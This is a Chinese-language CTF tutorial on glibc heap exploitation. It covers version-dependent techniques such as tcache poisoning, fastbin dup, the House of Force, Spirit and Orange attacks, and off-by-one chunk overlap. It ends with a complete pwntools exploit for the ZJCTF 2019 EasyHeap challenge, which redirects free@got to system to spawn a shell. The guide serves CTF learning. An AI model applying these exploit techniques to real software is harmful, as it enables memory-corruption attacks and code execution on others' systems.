# 堆利用

关键词：堆利用 heap pwn glibc UAF use after free double free fastbin dup tcache poisoning tcache stashing unlink unsorted bin leak main_arena house of force house of spirit house of orange off-by-one chunk overlap safe-linking tcache key __malloc_hook __free_hook patchelf pwninit

## ① 识别指纹

- 菜单题：`1. add  2. edit  3. delete  4. show  5. exit` —— 堆题最典型的外形
- 程序里有 `malloc`/`calloc` + 一个全局指针数组（`chunk_list` / `heaparray`）
- 栈上没有溢出（Canary/NX/PIE 随便开），但**堆上的长度/索引不可控**
- 能 `free` 后继续 `edit`/`show`（UAF）；或同一块能 `free` 两次（double free）
- `edit` 的长度由你再输入一次决定，能写超过申请大小（堆溢出）；或 `read` 多读 1 字节（off-by-one）
- 申请大小自己填、索引没有范围检查
- **附件带 `libc.so.6`**（常带 `ld-*.so`）—— 堆题几乎一定给 libc，因为所有偏移都依赖它
- 题名/提示：`heap`、`note`、`book`、`shop`、`manager`、`free`、`easyheap`、`babyheap`

## ② 考什么

- glibc 版本分层（先定版本，再谈打法）：
  - **2.23**（Ubuntu 16.04）：无 tcache；fastbin、unsorted bin、house of xxx 全盛期；`__malloc_hook`/`__free_hook` 可用
  - **2.26 / 2.27**（Ubuntu 18.04）：tcache 在 2.26 引入；2.27 的 tcache **没有 `key`**，double free 最容易
  - **2.29**：tcache 增加 `key` 字段做 double free 检测；unsorted bin attack、House of Force 被修
  - **2.31**（Ubuntu 20.04）：tcache + key，hook 仍在，是"现代题"里最好打的一档
  - **2.32**：引入 **safe-linking**，tcache/fastbin 的 `fd` 变成 `ptr ^ (fd_field_addr >> 12)`
  - **2.34**：`__free_hook`/`__malloc_hook` 被移除，结束手段转向 FSOP / `exit@GOT` / TLS
  - **2.35**（Ubuntu 22.04）：safe-linking + 无 hook，常见 House of Apple 2、large bin attack → FSOP
- chunk 结构：`prev_size` / `size` / `fd` / `bk`，`size` 低 3 位是 `PREV_INUSE` 等标志
- tcache：每个 size 类最多 7 个、LIFO、单链表、`next` + `key`；`tcache_perthread_struct` 在堆开头
- fastbin：LIFO、单链表、64 位下 chunk size `0x20`–`0x80`（默认 `global_max_fast = 0x80`）；double free 只检查是否等于当前 top
- UAF：`free` 后指针不清零，`show`/`edit` 仍能用
- double free → fastbin dup / tcache dup
- tcache poisoning：改已释放块的 `fd`，让下一次 `malloc` 返回任意地址
- unsorted bin leak：free 一个大于 tcache 范围（或 tcache 已满）的块，`fd`/`bk` = `main_arena + 0x58`（x86-64，需按版本核对）
- unsorted bin attack（≤2.28）：把 `bk` 改成目标，`malloc` 时把 `main_arena` 地址写过去
- House of Force（≤2.28）、House of Spirit、House of Orange（经典 ≤2.26）
- off-by-one / off-by-null → 改 size / `prev_size` → chunk overlap
- safe-linking 的编码与解码，以及"必须先有 heap 泄露"
- 结束手段：`__free_hook`/`__malloc_hook`（≤2.33）、FSOP（2.34+）、`exit@GOT`（No PIE）、TLS
- **`patchelf` / `pwninit` 把题目 libc 与 ld 对齐**，否则本地行为与远程不一致

## ③ 判断流程

### ③-1 子类型分流

1. 先定版本：`strings ./libc.so.6 | grep -i 'GNU C Library'`，或直接 `./libc.so.6`；零成本，先做 → 记下版本进 2
2. `checksec` 记下 Arch/RELRO/NX/PIE；没对齐题目 libc 就先 `patchelf`/`pwninit`，再 `ldd ./pwn` 确认本地加载的确实是题目 libc → 进 3
3. 程序有没有 `show`/打印 chunk 内容的选项？→ 有 → 可以走**泄露链**（③-2 A）；没有 → 只能盲打，进 4
4. `delete` 之后指针有没有置 NULL？→ 没置 NULL（还能 `show`/`edit`）→ **UAF 链**（③-2 B）；置 NULL → 进 5
5. `edit` 的长度能不能超过申请大小，或 `read` 是否多读 1 字节？→ 能 → **堆溢出/off-by-one 链**（③-2 B/D）；不能 → 进 6
6. 程序没有 `free`、只有溢出 → **House of Orange**；有 `free` 且能 free 一个伪造指针 → **House of Spirit**；能溢出到 top chunk 的 size 且版本 ≤ 2.28 → **House of Force** → ③-2 C；三类都不满足 → 进 7
7. 以上都不成立 → 回第 1 条，按版本重看（2.32+ 先找 heap leak，2.34+ 换结束手段）；仍无解 → 回 [题型总表](/map)

### ③-2 成本排序链

**A. 泄露链（先拿地址）**

1. 版本与 libc 对齐先做完（③-1 第 1–2 条）；没对齐之前算出的所有偏移都不可信 → 进 2
2. 找 heap 泄露：free 两个同 size 的块后 `show` 其中一个，读出的 `fd` 指向另一个块的 user 地址；2.32+ 是被 safe-linking 编码过的值，先按 `fd ^ (fd_field_addr >> 12)` 解 → 进 3
3. 找 libc 泄露：申请一个**大于 tcache 上限**的块（64 位 chunk size > 0x410；2.23 上 > 0x80 即可），在它后面再 malloc 一个 guard 块防止合并进 top，然后 free → 进 4
4. `show` 读 `fd`/`bk`：x86-64 上通常等于 `main_arena + 0x58`；不同版本/架构会变，先在题目 libc 上核对 → 进 5
5. 算 base：`libc_base = leak - 0x58 - main_arena_offset`；`main_arena_offset` 从题目 libc 取（`__malloc_hook + 0x10`，≤2.33；2.34+ 用 gdb 实测或 libc 数据库），**不要写死固定偏移** → 进 6
6. 自检：`libc_base & 0xfff == 0`，且泄露值低 12 位与 libc 里已知符号一致；不成立就是版本/偏移错了，回第 1 条 → 进 7
7. 有 base 后算出 `system`、`/bin/sh`、`__free_hook`/`__malloc_hook`/`_IO_list_all` 等目标地址 → 结束（交给 B/C/D 链使用）

**B. fd 篡改链（UAF / double free / 堆溢出 → 任意地址分配）**

1. 确认目标 size 落在哪个 bin：chunk size ≤ 0x80（64 位）是 fastbin；0x90–0x410 是 tcache；两者的检查不同 → 进 2
2. 拿到"能改已释放块 `fd`"的能力：UAF edit 直接改；或堆溢出写相邻已释放块；或 double free 制造重复项 → 进 3
3. 版本 ≥ 2.29 且走 tcache → 直接 `free(a);free(a)` 会被 `key` 拦（`double free detected in tcache 2`），先用 UAF 把 `key` 清零或改掉；改走 fastbin 则用 `free(a); free(b); free(a)` 绕开"只查当前 head"的检查 → 进 4
4. 版本 ≥ 2.32 → `fd` 必须编码：`fd = target ^ (fd_field_addr >> 12)`，`fd_field_addr` 是该空闲块的 user 指针（`chunk + 0x10`），先要有 heap 地址（A 组第 2 条）→ 进 5
5. 选伪造目标：要让 `malloc` 返回 `T`，伪造 chunk 头在 `T - 0x10`，size 字段在 `T - 0x8`，那里必须能通过 size 检查（fastbin 要匹配 size 类；tcache 2.32+ 还要 16 字节对齐）；程序全局区里常有一个"看起来像 size"的字节可用 → 进 6
6. `malloc` 两次：第一次拿回原块，第二次返回伪造地址；把目标（GOT/hook/函数指针/指针数组）写进去 → 进 7
7. 触发并验证：崩在 `malloc(): memory corruption (fast)` / `unaligned tcache chunk detected` → 回第 5 条换目标或改 size；写进去了但没反应 → 回第 6 条查触发点 → 结束

**C. House of xxx 链**

1. 先对版本：Force ≤ 2.28、Orange 经典 ≤ 2.26、Spirit 各版本可用但受 tcache 影响 → 版本不符直接跳过 → 进 2
2. **House of Force**：能溢出到 top chunk 的 size → 写成 `0xffffffffffffffff`（32 位 `0xffffffff`）→ 下一次 `malloc` 一个巨大的 size 把 top 推到目标附近 → 再 `malloc` 拿到目标；2.29+ 会被 `malloc(): corrupted top size` 拦下 → 进 3
3. **House of Spirit**：能 `free` 一个伪造指针 → 伪造块 size 合法、next chunk 的 size 也合法 → `free` 后再 `malloc` 拿回该地址；tcache 时代先确认该 size 的 tcache 未满 → 进 4
4. **House of Orange**：程序没有 `free` → 溢出 top chunk 把它改小 → 下一次 `malloc` 触发 `sysmalloc`，旧 top 被 `_int_free` 进 unsorted bin → 泄露 libc → 再用 unsorted bin attack / FSOP 改 `_IO_list_all`；2.27+ 有 vtable 校验，经典打法失效 → 进 5
5. 目标地址要可写且不踩坏 malloc 自己的元数据；在 gdb 里 `heap` 看一遍再发 → 进 6
6. 触发失败（`corrupted top size`、`free(): invalid size`、vtable 检查）→ 回第 1 条确认版本是否支持该 house → 结束

**D. off-by-one / chunk overlap**

1. 确认溢出字节数与位置：`read` 是否多读 1 字节、`edit` 是否多写 1 字节；零成本，看反汇编的循环边界 → 进 2
2. 经典 off-by-null：把下一个 chunk 的 `size` 最低字节清 0（如 `0x?71 → 0x?00`），同时把 `PREV_INUSE` 清掉 → 进 3
3. 在 `prev_size` 位置伪造上一个块的大小，让 `free` 时认为前一个块是空闲的 → 进 4
4. free 相邻块进 unsorted bin，再 `malloc` 切割，让两个指针指向重叠区域 → 进 5
5. 用重叠写改目标块的 `fd`/`size`，或直接改到指针数组 → 转 B 组第 6 条做任意写 → 进 6
6. 2.29+ 有 size/`prev_size` 一致性检查，遇到 `free(): invalid next size` / `corrupted size vs. prev_size` → 回第 2 条补伪造，或改走 House of Einherjar → 结束

## ④ 工具与命令

```bash
# 1) 对齐题目 libc —— 堆题第一步，别跳过
strings ./libc.so.6 | grep -i 'GNU C Library'      # 版本
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc.so.6 ./pwn
ldd ./pwn                                          # 确认加载的是题目 libc

# 2) pwninit 一键做同样的事
pwninit --bin ./pwn --libc ./libc.so.6 --ld ./ld-2.31.so
```

```bash
checksec --file=./pwn
one_gadget ./libc.so.6
ROPgadget --binary ./pwn | grep -E 'pop rdi|pop rsi|pop rdx'
```

```text
# gdb（pwndbg）看堆
pwndbg> heap
pwndbg> bins
pwndbg> vis_heap_chunks
pwndbg> p/x &main_arena
pwndbg> x/8gx <chunk_addr>        # 看 prev_size/size/fd/bk
```

```python
from pwn import *
context.binary = elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# safe-linking（2.32+）：pos 是 fd 字段自身地址，即 user 指针
def protect(pos, ptr):
    return ptr ^ (pos >> 12)

def unprotect(pos, val):
    return val ^ (pos >> 12)

# 常见结束手段（版本决定用哪个）
free_hook = libc.symbols['__free_hook'] + libc_base      # ≤ 2.33
system    = libc.symbols['system'] + libc_base
binsh     = next(libc.search(b'/bin/sh')) + libc_base
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 本地通、远程崩 | libc/ld 与题目不一致 | `pwninit`/`patchelf` 对齐题目 libc 与 ld，`ldd` 验证 |
| 泄露出的 `fd` 是堆地址不是 libc | 块进了 tcache（size ≤ 0x410，或 tcache 未满 7 个） | 先把该 size 的 tcache 填满 7 个，或换 > 0x410 的块 |
| free 之后 unsorted 没有 `fd` | 块紧邻 top，被合并进 top 了 | 先 malloc 一个 guard 块，再 free 目标块 |
| double free 直接 abort | 2.29+ 的 tcache `key` | 先用 UAF 改掉 `key`，或改走 fastbin |
| tcache poisoning 写 `fd` 后崩 | 2.32+ safe-linking 未编码，或 `pos` 用错 | `fd = target ^ (user_addr >> 12)`，`pos` 是 user 指针不是 chunk 头 |
| `malloc(): unaligned tcache chunk detected` | 2.32+ 目标未 16 字节对齐 | 目标地址取整到 16 字节 |
| House of Force 报 `corrupted top size` | 2.29+ 已修 | 放弃 Force，换其他 house 或 FSOP |
| unsorted bin attack 无效 | 2.29+ 已修 | 换 large bin attack / tcache stashing unlink / FSOP |
| `__free_hook` 符号不存在 | 2.34+ 已移除 | 改 FSOP（House of Apple 2）、`exit@GOT`、TLS |
| 覆盖 hook 后没触发 | 之后没有 free/malloc，或 base 算错 | 再触发一次；`libc_base` 必须页对齐 |
| off-by-one 后 `free(): invalid next size` | `prev_size`/`PREV_INUSE` 没配套 | gdb 看 chunk 头，按版本补齐伪造 |
| 改了指针数组但 edit 没写到目标 | fake chunk 与数组的实际偏移算错 | gdb 里 `x/gx` 对一遍 fake user 指针与数组地址的差值 |

## ⑥ 例题

**题目**：`[ZJCTF 2019] EasyHeap`
**来源**：ZJCTF 2019；BUUCTF 收录，附件与题目入口以原题平台为准

**题干**：一个堆菜单题，支持 create / edit / delete，没有 show。create 时自己填 size；edit 时再填一次 size 并读入内容。程序里另有一个需要满足条件的隐藏函数。

**关键观察**：
- `checksec`：64 位、Partial RELRO、Canary found、NX enabled、**No PIE（0x400000）**
- 随题 libc 是 Ubuntu 16 的 **2.23** —— 没有 tcache，fastbin 攻击不受 `key` 限制
- `delete` 会把指针置 NULL，不能直接 double free；但 `edit` 的 size 由用户再输入，**可以越过本块写相邻块**
- 全局 `heaparray = 0x6020e0`；`0x6020ad` 开始的伪造块，其 size 字段（`0x6020b5`）处的字节是 `0x7f`
- No PIE + Partial RELRO → `free@got` 可写，`system@plt` 地址固定，不需要泄露 libc

**走了哪条链**：③-1 第 1 条（版本 2.23）→ 第 3 条（无 show，盲打）→ 第 4 条（指针置 NULL，不走 UAF）→ 第 5 条（edit 可越界）→ ③-2 B 组第 1 条（fastbin）→ 第 2 条（越界改 `fd`）→ 第 5 条（伪造块）→ 第 6 条（写 heaparray / `free@got`）→ 第 7 条（free 触发）。

**命令与输出**：

```text
$ checksec --file=easyheap
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

伪造块与目标数组的偏移是算出来的：

```text
heaparray          = 0x6020e0
伪造 chunk 头      = 0x6020ad   -> size 字段在 0x6020b5，值为 0x7f
malloc 返回 user   = 0x6020ad + 0x10 = 0x6020bd
0x6020e0 - 0x6020bd = 0x23      -> 从 user 指针写到 heaparray[0] 的偏移
```

`0x7f` 经过 `chunksize` 掩码后是 `0x78`，与 `0x70` 落在同一个 fastbin 索引，所以这个伪造 size 能通过检查。

```python
from pwn import *
context.binary = elf = ELF('./easyheap')
p = process('./easyheap')          # 远程换成 remote(...)

def create(size, data):
    p.sendlineafter(b'Choice', b'1')       # 菜单提示串按题目实际输出替换
    p.sendlineafter(b'size', str(size).encode())
    p.sendafter(b'Content', data)

def edit(idx, data):
    p.sendlineafter(b'Choice', b'2')
    p.sendlineafter(b'index', str(idx).encode())
    p.sendlineafter(b'size', str(len(data)).encode())
    p.sendafter(b'Content', data)

def delete(idx):
    p.sendlineafter(b'Choice', b'3')
    p.sendlineafter(b'index', str(idx).encode())

# 1. 三个 0x70 的 chunk；free(2) 进 fastbin
for _ in range(3):
    create(0x68, b'A' * 0x68)
delete(2)

# 2. 越界写 chunk1：把 chunk2 的 size 写回 0x71，fd 改成伪造块
edit(1, b'A' * 0x68 + p64(0x71) + p64(0x6020ad))

# 3. 两次 malloc：第二次返回 0x6020bd，正好改到 heaparray
create(0x68, b'B' * 0x68)
create(0x68, b'A' * 0x23 + p64(elf.got['free']))

# 4. heaparray[0] 已指向 free@got，edit(0) 就是把 system@plt 写进去
edit(0, p64(elf.plt['system']))

# 5. 让 free 收到 "/bin/sh"
create(0x68, b'/bin/sh\x00')
delete(4)                          # 索引按实际分配顺序确认

p.interactive()
```

**结果**：`free("/bin/sh")` 变成 `system("/bin/sh")`，拿到 shell 后 `cat flag`，得到 `flag{...}`。flag 内容以原题平台为准。

::: tip 为什么这题不用泄露 libc
No PIE 让 `system@plt` 与 `free@got` 都是固定地址，Partial RELRO 让 GOT 可写。堆题不是每道都要先泄露 libc：**能直接用二进制里的 PLT 就不碰 libc**，这是成本最低的一条路。反过来，一旦开了 PIE 或 Full RELRO，就必须先走 A 组拿 libc base。
:::
